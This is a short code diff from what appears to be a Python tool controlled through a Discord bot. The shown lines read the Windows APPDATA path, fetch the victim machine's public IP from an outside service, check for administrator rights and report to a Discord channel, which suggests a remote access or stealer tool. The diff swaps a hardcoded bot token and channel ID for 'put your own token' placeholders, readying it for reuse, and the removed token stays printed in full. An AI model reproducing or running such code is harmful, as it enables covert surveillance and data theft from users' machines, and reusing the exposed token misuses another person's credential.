@@ -26,7 +26,7 @@ from cryptography.hazmat.primitives.ciphers import (
 
 
 
-token = 'NzkwMTc3MDQ3NTI3NTU1MDcz.X98zuA.SGtPNFfnYTjzBsMb5j2oOzTqf3g'
+token = '' #put your own token
 global appdata
 appdata = os.getenv('APPDATA')
 client = discord.Client()
@@ -121,7 +121,7 @@ async def on_ready():
     ip = get('https://api.ipify.org').text
     pp = ip
     import os
-    channel = client.get_channel("790177781764849674")  # Put ID of channel here
+    channel = client.get_channel("")  # Put ID of channel here
 
     is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
     if is_admin == True:
